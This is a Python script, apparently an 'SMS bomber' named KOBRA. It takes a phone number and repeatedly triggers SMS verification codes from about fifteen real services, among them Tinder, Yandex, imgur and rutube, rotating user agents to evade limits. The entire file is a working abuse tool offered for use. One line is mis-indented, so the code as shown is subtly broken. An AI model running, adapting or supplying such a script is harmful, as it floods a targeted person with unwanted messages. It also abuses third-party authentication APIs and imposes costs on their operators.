import requests
from time import sleep
from os import system
from user_agent import generate_user_agent
from colorama import Fore, Style
def logo():
    print(Fore.GREEN +" _   ___________________  ___   ")
    print(Fore.GREEN +"| | / /  _  | ___ \ ___ \/ _ \  ")
    print(Fore.GREEN +"| |/ /| | | | |_/ / |_/ / /_\ \ ")
    print(Fore.GREEN +"|    \| | | | ___ \    /|  _  | ")
    print(Fore.GREEN +"| |\  \ \_/ / |_/ / |\ \| | | | ")
    print(Fore.GREEN +"\_| \_/\___/\____/\_| \_\_| |_/ ")

headers = {"User-Agent": generate_user_agent()}
try:
    system("clear")
except:
    pass

try:
    system("cls")
except:
    pass 


logo()
print("\n")
print("         By DedSec77")
print(Style.RESET_ALL)

print("\n")

number = input('Write phone number (with out +): ' )

count = int(input("How many cycles: "))

delay = int(input('Delay: '))

system("cls")

print(Fore.GREEN + "KOBRA start spam sms!")

print(Style.RESET_ALL)

for i in range(count):
    headers = {"User-Agent": generate_user_agent()}

    a = requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={"phone_number": number}, headers=headers)

    print(a)

    sleep(delay)


    b = requests.post("https://bamper.by/registration/?step=1", data={"phone": "+" + number, "submit": "Запросить смс подтверждения", "rules": "on"}, headers=headers)

    print(b)

    sleep(delay)


    c = requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": number}, headers=headers)

    print(c)

   sleep(delay)

    d = requests.post("https://eda.yandex/api/v1/user/request_authentication_code", headers=headers, json={"phone_number": "+" + number})

    print(d)

    sleep(delay)

    e = requests.post("https://api.iconjob.co/api/auth/verification_code", json={"phone": number}, headers=headers)

    print(e)

    sleep(delay)

    g = requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": number}, headers=headers)

    print(g)

    sleep(delay)

    h = requests.post("https://api.imgur.com/account/v1/phones/verify", json={"phone_number": number, "region_code": "RU"}, headers=headers)

    print(h)

    sleep(delay)

    k = requests.post("https://thehive.pro/auth/signup", json={"phone": "+" + number}, headers=headers)

    print(k)

    sleep(delay)

    j = requests.post("https://client-api.sushi-master.ru/api/v1/auth/init", json={"phone": number}, headers=headers)
    print(j)

    l = requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": number}, headers=headers)

    print(l)

    sleep(delay)

    m = requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/", json={"phone": "+" + number}, headers=headers)

    print(m)

    n = requests.post("https://rieltor.ua/api/users/register-sms/", json={"phone": number, "retry": 0}, headers=headers)

    print(n)

    sleep(delay)

    x = requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": number}, headers=headers)

    print(x)

    sleep(delay)

    z = requests.post("https://account.my.games/signup_send_sms/", data={"phone": number}, headers=headers)

    print(z)

    sleep(delay)

print("Spam end")
